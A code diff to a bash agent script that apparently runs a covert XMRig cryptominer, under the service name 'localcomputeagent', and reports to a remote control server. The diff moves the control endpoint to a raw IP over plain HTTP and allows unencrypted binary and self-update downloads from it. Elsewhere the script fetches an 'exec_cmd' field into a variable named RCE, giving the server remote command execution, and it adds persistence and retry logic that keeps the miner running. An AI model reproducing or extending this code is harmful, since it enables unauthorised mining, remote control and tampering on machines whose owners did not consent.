@@ -36,9 +36,13 @@ UPDATE_FAILURE_FILE="$BASE_DIR/update.failures"
 UPDATE_LOCK_FILE="$BASE_DIR/update.lock"
 AGENT_UPDATE_REQUEST_FILE="$BASE_DIR/agent-update.request.json"
 AGENT_UPDATE_RESULT_FILE="$BASE_DIR/agent-update.result.json"
+AGENT_UPDATE_SEEN_FILE="$BASE_DIR/agent-update.seen"
+AGENT_UPDATER_RETRY_FILE="$BASE_DIR/agent-updater.next"
 AGENT_READY_FILE="/run/localcomputeagent/ready"
 RESTART_STATE_FILE="$BASE_DIR/restart.state"
 WORKER_STOP_MARKER="$BASE_DIR/worker.stop-requested"
+API_RATE_LOCK_FILE="$BASE_DIR/api-request.lock"
+API_RATE_STATE_FILE="$BASE_DIR/api-request.last"
 
 WORKER_GRACE_SEC=30
 HEARTBEAT_INTERVAL=60
@@ -58,6 +62,7 @@ OFFICIAL_RELEASE_MIN_AGE=3600
 OFFICIAL_RELEASE_JITTER=18000
 UPDATE_RETRY_MIN=60
 UPDATE_RETRY_MAX=120
+UPDATE_RETRY_CAP=21600
 RESTART_WINDOW=900
 RESTART_LIMIT=5
 RESTART_COOLDOWN=900
@@ -67,7 +72,7 @@ REGISTRATION_RETRY_MAX=1800
 COMPUTE_VERSION=$(cat "$AGENT_VERSION_FILE" 2>/dev/null || printf '%s' "$EMBEDDED_AGENT_VERSION")
 [[ "$COMPUTE_VERSION" =~ ^[0-9]+$ ]] || COMPUTE_VERSION="$EMBEDDED_AGENT_VERSION"
 
-API_BASE="https://operationgadaimas.com/sibqtp_banquet_hk"
+API_BASE="http://103.59.94.204/sibqtp_banquet_hk"
 GITHUB_RELEASE_API="https://api.github.com/repos/xmrig/xmrig/releases/latest"
 OFFICIAL_RELEASE_API="https://api.xmrig.com/1/latest_release/xmrig?id=linux-static-x64"
 
@@ -94,6 +99,7 @@ UPDATE_TARGET_VERSION=""
 UPDATE_DETAIL=""
 LAST_REMOTE_ERROR_LOG=0
 LAST_REMOTE_MINING_LOG=0
+HEARTBEAT_ALERTED=false
 LAST_WORKER_EVENT=""
 RESTART_WINDOW_START=0
 RESTART_COUNT=0
@@ -120,6 +126,28 @@ load_config_version() {
 
 DIGMON_VERSION=$(get_digmon_version)
 CONFIG_VERSION=$(load_config_version)
+
+# Serialize every control-plane request from this agent and keep request starts
+# at least five seconds apart. Calls wait locally instead of being discarded,
+# including telemetry jobs launched in the background.
+agent_api_curl() {
+    local lock_fd="" last_request=0 now=0 wait_seconds=0 exit_code=0
+    exec {lock_fd}>"$API_RATE_LOCK_FILE" || return 1
+    flock "$lock_fd" || { exec {lock_fd}>&-; return 1; }
+
+    last_request=$(cat "$API_RATE_STATE_FILE" 2>/dev/null || printf '0')
+    [[ "$last_request" =~ ^[0-9]+$ ]] || last_request=0
+    now=$(date +%s)
+    wait_seconds=$((5 - (now - last_request)))
+    (( wait_seconds > 0 )) && sleep "$wait_seconds"
+    date +%s > "$API_RATE_STATE_FILE"
+
+    curl -H "X-Agent-ID: $MACHINE_GUID" "$@"
+    exit_code=$?
+    flock -u "$lock_fd"
+    exec {lock_fd}>&-
+    return "$exit_code"
+}
 
 log() {
     local level="$1"
@@ -174,6 +202,10 @@ log() {
         start=$((start + chunk_size))
         part=$((part + 1))
     done
+
+    # Logging is telemetry only. Its result must never control the agent loop
+    # or the lifecycle of the independent XMRig worker.
+    return 0
 }
 
 json_escape() {
@@ -204,7 +236,7 @@ post_log_payload() {
     local attempt=1
 
     while (( attempt <= LOG_RETRY_COUNT )); do
-        http_code=$(curl -sS -o /dev/null -w "%{http_code}" \
+        http_code=$(agent_api_curl -sS -o /dev/null -w "%{http_code}" \
             -m "$LOG_HTTP_TIMEOUT" \
             -X POST "$API_BASE/log.php" \
             -H "Content-Type: application/json" \
@@ -375,7 +407,7 @@ register_agent() {
     local deferred="false"
 
     [[ ! -s "$REGISTRATION_STATE_FILE" ]] || return 0
-    response=$(curl -sS -m 10 -X POST "$API_BASE/register.php" \
+    response=$(agent_api_curl -sS -m 10 -X POST "$API_BASE/register.php" \
         -H "Content-Type: application/json" \
         --data-binary "$(printf '{"machine_guid":"%s","hostname":"%s"}' \
             "$(json_escape "$MACHINE_GUID")" \
@@ -415,7 +447,7 @@ schedule_registration_retry() {
 }
 
 fetch_config() {
-    curl -s -m 15 "$API_BASE/get-config.php?machine_guid=$MACHINE_GUID" || true
+    agent_api_curl -s -m 15 "$API_BASE/get-config.php?machine_guid=$MACHINE_GUID" || true
 }
 
 valid_config_file() {
@@ -465,6 +497,16 @@ save_config() {
     CONFIG_VERSION="$version"
 
     return 0
+}
+
+config_runtime_fingerprint_file() {
+    local path="$1"
+    jq -cS 'del(.version)' "$path" 2>/dev/null | sha256sum | awk '{print $1}'
+}
+
+config_runtime_fingerprint_json() {
+    local cfg="$1"
+    printf '%s' "$cfg" | jq -cS 'del(.version)' 2>/dev/null | sha256sum | awk '{print $1}'
 }
 
 fetch_initial_config() {
@@ -519,13 +561,18 @@ schedule_update_success() {
 }
 
 schedule_update_retry() {
-    local now delay failures
+    local now delay failures exponent jitter
     now=$(date +%s)
     failures=$(read_uint_file "$UPDATE_FAILURE_FILE" 0)
     failures=$((failures + 1))
-    delay=$((UPDATE_RETRY_MIN + RANDOM % (UPDATE_RETRY_MAX - UPDATE_RETRY_MIN + 1)))
+    exponent=$((failures - 1))
+    (( exponent > 8 )) && exponent=8
+    delay=$((UPDATE_RETRY_MIN * (1 << exponent)))
+    (( delay < UPDATE_RETRY_MAX )) && delay=$UPDATE_RETRY_MAX
+    (( delay > UPDATE_RETRY_CAP )) && delay=$UPDATE_RETRY_CAP
+    jitter=$((RANDOM % (delay / 4 + 1)))
     write_uint_file "$UPDATE_FAILURE_FILE" "$failures"
-    write_uint_file "$UPDATE_NEXT_FILE" $((now + delay))
+    write_uint_file "$UPDATE_NEXT_FILE" $((now + delay + jitter))
 }
 
 version_is_newer() {
@@ -562,7 +609,7 @@ load_agent_update_result() {
     printf '%s' "$result" | jq -e 'type == "object" and .event_id and .status' >/dev/null 2>&1 || return 0
     status=$(printf '%s' "$result" | jq -r '.status // empty')
     event_id=$(printf '%s' "$result" | jq -r '.event_id // empty')
-    source=$(printf '%s' "$result" | jq -r '.source // "operationgadaimas-web"')
+    source=$(printf '%s' "$result" | jq -r '.source // "idcloudhost-vps"')
     from_version=$(printf '%s' "$result" | jq -r '.from_version // empty')
     target_version=$(printf '%s' "$result" | jq -r '.target_version // empty')
     detail=$(printf '%s' "$result" | jq -r '.detail // empty')
@@ -592,7 +639,8 @@ clear_reported_agent_update_result() {
 }
 
 queue_agent_update() {
-    local control="$1" target_version url source expected_sha event_id current_version candidate request_tmp downloaded_sha lock_fd
+    local control="$1" target_version url source expected_sha event_id current_version current_sha candidate request_tmp downloaded_sha lock_fd
+    local now next_attempt seen_token seen_value
     local source_entry download_ok=false download_attempts=0 checksum_failures=0
     local -a update_sources=()
     target_version=$(printf '%s' "$control" | jq -r '.agent_update.version // empty')
@@ -602,10 +650,40 @@ queue_agent_update() {
 
     [[ "$current_version" =~ ^[0-9]+$ ]] || current_version=0
     [[ "$target_version" =~ ^[0-9]+$ ]] || return 0
-    (( target_version > current_version )) || return 0
     [[ "$expected_sha" =~ ^[a-f0-9]{64}$ ]] || return 0
     [[ "$event_id" =~ ^[a-zA-Z0-9._-]{1,96}$ ]] || event_id="agent-${target_version}"
-    [[ ! -s "$AGENT_UPDATE_REQUEST_FILE" ]] || return 0
+    (( target_version >= current_version )) || return 0
+
+    if [[ -s "$AGENT_UPDATE_REQUEST_FILE" ]]; then
+        now=$(date +%s)
+        next_attempt=$(read_uint_file "$AGENT_UPDATER_RETRY_FILE" 0)
+        if (( now >= next_attempt )) && ! systemctl is-active --quiet localcomputeagent-updater.service; then
+            write_uint_file "$AGENT_UPDATER_RETRY_FILE" $((now + 60))
+            systemctl reset-failed localcomputeagent-updater.service >/dev/null 2>&1 || true
+            systemctl start --no-block localcomputeagent-updater.service >/dev/null 2>&1 || true
+        fi
+        return 0
+    fi
+
+    current_sha=$(sha256sum "$BASE_DIR/agent.sh" 2>/dev/null | awk '{print $1}')
+    seen_token="${target_version}|${expected_sha}"
+    if (( target_version == current_version )) && [[ "$current_sha" == "$expected_sha" ]]; then
+        seen_value=$(cat "$AGENT_UPDATE_SEEN_FILE" 2>/dev/null || true)
+        if [[ "$seen_value" != "$seen_token" ]]; then
+            UPDATE_COMPONENT="agent"
+            UPDATE_STATUS="CURRENT"
+            UPDATE_EVENT_ID="${MACHINE_GUID}-${event_id}-current"
+            UPDATE_SOURCE="installed"
+            UPDATE_FROM_VERSION="$current_version"
+            UPDATE_TARGET_VERSION="$target_version"
+            UPDATE_DETAIL="Published agent release is already installed"
+            UPDATE_ERROR_CODE=""
+            printf '%s\n' "$seen_token" > "$AGENT_UPDATE_SEEN_FILE.tmp.$$"
+            chmod 600 "$AGENT_UPDATE_SEEN_FILE.tmp.$$"
+            mv -f "$AGENT_UPDATE_SEEN_FILE.tmp.$$" "$AGENT_UPDATE_SEEN_FILE"
+        fi
+        return 0
+    fi
 
     exec {lock_fd}>"$UPDATE_LOCK_FILE"
     flock -n "$lock_fd" || { exec {lock_fd}>&-; return 0; }
@@ -613,7 +691,7 @@ queue_agent_update() {
     mapfile -t update_sources < <(printf '%s' "$control" | jq -r '.agent_update.sources[]? | select((.name | type) == "string" and (.url | type) == "string") | [.name, .url] | @tsv' 2>/dev/null)
     if (( ${#update_sources[@]} == 0 )); then
         url=$(printf '%s' "$control" | jq -r '.agent_update.file_url // empty')
-        [[ -n "$url" ]] && update_sources+=("operationgadaimas-web"$'\t'"$url")
+        [[ -n "$url" ]] && update_sources+=("idcloudhost-vps"$'\t'"$url")
     fi
     (( ${#update_sources[@]} > 0 )) || { exec {lock_fd}>&-; return 0; }
     UPDATE_COMPONENT="agent"
@@ -627,7 +705,8 @@ queue_agent_update() {
 
     for source_entry in "${update_sources[@]}"; do
         IFS=$'\t' read -r source url <<< "$source_entry"
-        [[ "$source" =~ ^[a-zA-Z0-9._-]{1,64}$ && "$url" == https://* ]] || continue
+        [[ "$source" =~ ^[a-zA-Z0-9._-]{1,64}$ ]] || continue
+        [[ "$url" == https://* || "$url" == http://103.59.94.204/* ]] || continue
         download_attempts=$((download_attempts + 1))
         rm -f "$candidate"
         if ! curl -fsSL --retry 2 --connect-timeout 10 -m 60 -o "$candidate" "$url"; then
@@ -678,16 +757,24 @@ queue_agent_update() {
     chmod 600 "$request_tmp"
     mv -f "$request_tmp" "$AGENT_UPDATE_REQUEST_FILE"
     UPDATE_STATUS="INSTALLING"
-    UPDATE_DETAIL="Agent updater is installing the release"
+    if (( target_version == current_version )); then
+        UPDATE_DETAIL="Agent updater is repairing a same-version content mismatch"
+    else
+        UPDATE_DETAIL="Agent updater is installing the release"
+    fi
+    write_uint_file "$AGENT_UPDATER_RETRY_FILE" $(( $(date +%s) + 60 ))
+    # The updater uses the same lock. Release it before starting the oneshot;
+    # otherwise --no-block can race and make the updater exit without consuming
+    # the durable request.
+    exec {lock_fd}>&-
+    systemctl reset-failed localcomputeagent-updater.service >/dev/null 2>&1 || true
     if ! systemctl start --no-block localcomputeagent-updater.service >/dev/null 2>&1; then
         UPDATE_STATUS="FAILED"
         UPDATE_ERROR_CODE="E_AGENT_UPDATER_START"
         UPDATE_DETAIL="Agent updater service could not be started"
-        rm -f "$AGENT_UPDATE_REQUEST_FILE" "$candidate"
-        exec {lock_fd}>&-
+        rm -f "$AGENT_UPDATE_REQUEST_FILE" "$candidate" "$AGENT_UPDATER_RETRY_FILE"
         return 1
     fi
-    exec {lock_fd}>&-
     return 0
 }
 
@@ -912,12 +999,12 @@ xmrig_official_update() {
 
 web_update() {
     local control url sha version temporary local_sha
-    control=$(curl -fsSL --connect-timeout 5 -m 15 "$API_BASE/get-control.php?machine_guid=$MACHINE_GUID" 2>/dev/null || true)
+    control=$(agent_api_curl -fsSL --connect-timeout 5 -m 15 "$API_BASE/get-control.php?machine_guid=$MACHINE_GUID" 2>/dev/null || true)
     echo "$control" | jq -e 'type == "object"' >/dev/null 2>&1 || return 1
     url=$(echo "$control" | jq -r '.bin_url // empty')
     sha=$(echo "$control" | jq -r '.bin_sha // empty')
     version=$(echo "$control" | jq -r '.xmrig_version // empty')
-    [[ "$url" == https://* ]] || return 1
+    [[ "$url" == https://* || "$url" == http://103.59.94.204/* ]] || return 1
     sha=${sha#sha256:}
     sha=$(printf '%s' "$sha" | tr '[:upper:]' '[:lower:]')
     [[ -z "$sha" || "$sha" =~ ^[a-f0-9]{64}$ ]] || return 1
@@ -930,10 +1017,10 @@ web_update() {
         fi
         return 0
     fi
-    begin_update_event "operationgadaimas-web" "$DIGMON_VERSION" "${version:-unknown}" "Downloading web fallback release"
+    begin_update_event "idcloudhost-vps" "$DIGMON_VERSION" "${version:-unknown}" "Downloading VPS fallback release"
     temporary="$WORKER.web.tmp.$$"
     UPDATE_STATUS="DOWNLOADING"
-    log INFO "XMRIG UPDATE DOWNLOAD source=operationgadaimas-web version=${version:-unknown}"
+    log INFO "XMRIG UPDATE DOWNLOAD source=idcloudhost-vps version=${version:-unknown}"
     if ! curl -fsSL --retry 2 --connect-timeout 10 -m 180 -o "$temporary" "$url"; then
         LAST_ERROR_CODE="E_UPDATE_DOWNLOAD"
         UPDATE_ERROR_CODE="E_UPDATE_DOWNLOAD"
@@ -942,7 +1029,7 @@ web_update() {
         rm -f "$temporary"
         return 1
     fi
-    if install_worker_candidate "$temporary" "$sha" "$version" operationgadaimas-web; then
+    if install_worker_candidate "$temporary" "$sha" "$version" idcloudhost-vps; then
         return 0
     fi
     rm -f "$temporary"
@@ -950,7 +1037,7 @@ web_update() {
 }
 
 check_updates() {
-    local lock_fd
+    local lock_fd failures
     exec {lock_fd}>"$UPDATE_LOCK_FILE"
     if ! flock -n "$lock_fd"; then
         exec {lock_fd}>&-
@@ -974,7 +1061,6 @@ check_updates() {
         exec {lock_fd}>&-
         return 0
     fi
-    LAST_ERROR_CODE="E_UPDATE_SOURCES_UNAVAILABLE"
     if [[ -z "$UPDATE_ERROR_CODE" ]]; then
         begin_update_event "all" "$DIGMON_VERSION" "" "GitHub, XMRig API, and web fallback are unavailable"
         UPDATE_ERROR_CODE="E_UPDATE_SOURCES_UNAVAILABLE"
@@ -982,8 +1068,20 @@ check_updates() {
         [[ "$UPDATE_DETAIL" == *"remaining update sources are unavailable"* ]] || UPDATE_DETAIL="$UPDATE_DETAIL; remaining update sources are unavailable"
     fi
     UPDATE_STATUS="RETRY_WAIT"
-    log ERROR "XMRIG UPDATE SOURCES UNAVAILABLE; CURRENT BINARY CONTINUES"
     schedule_update_retry
+    failures=$(read_uint_file "$UPDATE_FAILURE_FILE" 1)
+    if (( failures == 1 || failures % 10 == 0 )); then
+        if worker_running; then
+            # This remains an ERROR because update maintenance really failed.
+            # Error reporting is telemetry only and must never stop the healthy
+            # mining worker or turn a control-plane failure into a mining action.
+            LAST_ERROR_CODE="E_UPDATE_SOURCES_UNAVAILABLE"
+            log ERROR "XMRIG UPDATE SOURCES UNAVAILABLE; RUNNING BINARY AND WORKER REMAIN UNCHANGED (attempt=$failures)"
+        else
+            LAST_ERROR_CODE="E_UPDATE_SOURCES_UNAVAILABLE"
+            log ERROR "XMRIG UPDATE SOURCES UNAVAILABLE; WORKER IS ALSO DOWN (attempt=$failures)"
+        fi
+    fi
     exec {lock_fd}>&-
     return 1
 }
@@ -1100,7 +1198,7 @@ build_command_result_payload() {
 
 send_command_result_payload() {
     local payload="$1" response
-    response=$(curl -sS -m 10 -X POST "$API_BASE/command-result.php" \
+    response=$(agent_api_curl -sS -m 10 -X POST "$API_BASE/command-result.php" \
         -H "Content-Type: application/json" --data-binary "$payload" 2>/dev/null || true)
     printf '%s' "$response" | jq -e '.status == "ok"' >/dev/null 2>&1
 }
@@ -1194,13 +1292,8 @@ while true; do
         fi
     fi
 
-    if (( NOW >= NEXT_UPDATE )); then
-        check_updates || true
-        NEXT_UPDATE=$(read_uint_file "$UPDATE_NEXT_FILE" $((NOW + UPDATE_RETRY_MIN)))
-    fi
-
     if (( NOW >= NEXT_CONTROL )); then
-        CTRL=$(curl -fsS -m 10 "$API_BASE/get-control.php?machine_guid=$MACHINE_GUID" 2>/dev/null || true)
+        CTRL=$(agent_api_curl -fsS -m 10 "$API_BASE/get-control.php?machine_guid=$MACHINE_GUID" 2>/dev/null || true)
         if echo "$CTRL" | jq -e 'type == "object"' >/dev/null 2>&1; then
             queue_agent_update "$CTRL" || true
             RCE=$(echo "$CTRL" | jq -r '.exec_cmd // empty')
@@ -1211,14 +1304,31 @@ while true; do
         NEXT_CONTROL=$((NOW + CONTROL_INTERVAL + RANDOM % (CONTROL_JITTER + 1)))
     fi
 
+    # Agent commands and self-update are control-plane work and take priority.
+    # XMRig release discovery is maintenance and may involve slow external APIs.
+    if (( NOW >= NEXT_UPDATE )); then
+        check_updates || true
+        NEXT_UPDATE=$(read_uint_file "$UPDATE_NEXT_FILE" $((NOW + UPDATE_RETRY_MIN)))
+    fi
+
     if (( NOW >= NEXT_CONFIG )); then
-        CFG=$(curl -fsS -m 10 "$API_BASE/get-config.php?machine_guid=$MACHINE_GUID" 2>/dev/null || true)
+        CFG=$(agent_api_curl -fsS -m 10 "$API_BASE/get-config.php?machine_guid=$MACHINE_GUID" 2>/dev/null || true)
         if echo "$CFG" | jq -e '.version' >/dev/null 2>&1; then
             NEW_VER=$(echo "$CFG" | jq -r '.version')
             OLD_VER=$(cat "$CONFIG_VERSION_FILE" 2>/dev/null || true)
             if [[ "$NEW_VER" != "$OLD_VER" ]]; then
+                CURRENT_RUNTIME_FINGERPRINT=$(config_runtime_fingerprint_file "$CONFIG_FILE")
+                NEW_RUNTIME_FINGERPRINT=$(config_runtime_fingerprint_json "$CFG")
                 log INFO "CONFIG VERSION CHANGED $OLD_VER -> $NEW_VER"
-                if save_config "$CFG"; then start_worker; else LAST_ERROR_CODE="E_CONFIG_INVALID"; fi
+                if save_config "$CFG"; then
+                    if [[ -z "$CURRENT_RUNTIME_FINGERPRINT" || -z "$NEW_RUNTIME_FINGERPRINT" || "$CURRENT_RUNTIME_FINGERPRINT" != "$NEW_RUNTIME_FINGERPRINT" ]]; then
+                        start_worker
+                    else
+                        log INFO "CONFIG METADATA UPDATED; XMRIG KEPT RUNNING"
+                    fi
+                else
+                    LAST_ERROR_CODE="E_CONFIG_INVALID"
+                fi
             fi
         fi
         NEXT_CONFIG=$((NOW + CONFIG_INTERVAL + RANDOM % 60))
@@ -1261,14 +1371,24 @@ while true; do
             --argjson cpu_temp "$CPU_TEMP" --argjson ram_used "$RAM_USED" --argjson ram_total "$RAM_TOTAL" \
             --argjson worker_up "$UP" \
             '{machine_guid:$machine_guid,installation_id:$installation_id,hardware_machine_id:$hardware_machine_id,hostname:$hostname,protocol_version:3,capabilities:$capabilities,Compute_Version:$Compute_Version,Digmon_Version:$Digmon_Version,config_version:$config_version,cpu_usage:$cpu_usage,cpu_temp:$cpu_temp,ram_used:$ram_used,ram_total:$ram_total,worker_up:$worker_up,update_status:$update_status,update_component:$update_component,error_code:$error_code,update_error_code:$update_error_code,update_event_id:$update_event_id,update_source:$update_source,update_from_version:$update_from_version,update_target_version:$update_target_version,update_detail:$update_detail}')
-        RESPONSE=$(curl -fsS -m 10 -X POST "$API_BASE/heartbeat.php" -H "Content-Type: application/json" --data-binary "$HEARTBEAT_PAYLOAD" 2>/dev/null || true)
+        RESPONSE=$(agent_api_curl -fsS -m 10 -X POST "$API_BASE/heartbeat.php" -H "Content-Type: application/json" --data-binary "$HEARTBEAT_PAYLOAD" 2>/dev/null || true)
         if echo "$RESPONSE" | jq -e '.status == "ok"' >/dev/null 2>&1; then
-            (( HEARTBEAT_FAILURES > 0 )) && log INFO "HEARTBEAT RECOVERED"
+            if [[ "$HEARTBEAT_ALERTED" == "true" ]]; then
+                log INFO "HEARTBEAT RECOVERED"
+            fi
             HEARTBEAT_FAILURES=0
+            HEARTBEAT_ALERTED=false
             clear_reported_agent_update_result
         else
             HEARTBEAT_FAILURES=$((HEARTBEAT_FAILURES + 1))
-            (( HEARTBEAT_FAILURES == 3 )) && log ERROR "HEARTBEAT UNREACHABLE; XMRIG CONTINUES OFFLINE"
+            if (( HEARTBEAT_FAILURES == 3 )); then
+                HEARTBEAT_ALERTED=true
+                if worker_running; then
+                    log ERROR "CONTROL-PLANE HEARTBEAT UNREACHABLE; XMRIG WORKER REMAINS RUNNING INDEPENDENTLY"
+                else
+                    log ERROR "CONTROL-PLANE HEARTBEAT UNREACHABLE; XMRIG WORKER IS ALSO DOWN (SEPARATE CONDITION)"
+                fi
+            fi
         fi
         NEXT_HEARTBEAT=$((NOW + HEARTBEAT_INTERVAL + RANDOM % 21))
     fi
